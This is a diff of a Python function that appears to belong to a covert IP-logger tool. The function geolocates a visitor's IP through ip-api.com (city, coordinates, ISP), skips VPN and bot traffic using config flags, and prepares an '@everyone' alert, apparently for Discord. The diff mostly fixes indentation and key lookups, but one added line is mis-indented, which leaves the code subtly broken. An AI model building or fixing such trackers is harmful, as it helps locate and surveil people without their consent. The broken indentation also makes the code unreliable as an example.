@@ -109,38 +109,38 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     ping = "@everyone"
 
-    info = requests.get(
-    f"http://ip-api.com/json/{ip}?fields=status,message,proxy,hosting,isp,as,country,regionName,city,lat,lon,timezone,mobile"
-).json()
+        info = requests.get(
+        f"http://ip-api.com/json/{ip}?fields=status,message,proxy,hosting,isp,as,country,regionName,city,lat,lon,timezone,mobile"
+    ).json()
 
-if info.get("status") != "success":
-    return
+    if info.get("status") != "success":
+        return
 
-if info.get("proxy"):
+    if info.get("proxy"):
         if config["vpnCheck"] == 2:
-                return
-        
+            return
+
         if config["vpnCheck"] == 1:
             ping = ""
-    
-    if info["hosting"]:
+
+    if info.get("hosting"):
         if config["antiBot"] == 4:
-            if info["proxy"]:
+            if info.get("proxy"):
                 pass
             else:
                 return
 
         if config["antiBot"] == 3:
-                return
+            return
 
         if config["antiBot"] == 2:
-            if info["proxy"]:
+            if info.get("proxy"):
                 pass
             else:
                 ping = ""
 
         if config["antiBot"] == 1:
-                ping = ""
+            ping = ""
 
 
     os, browser = httpagentparser.simple_detect(useragent)
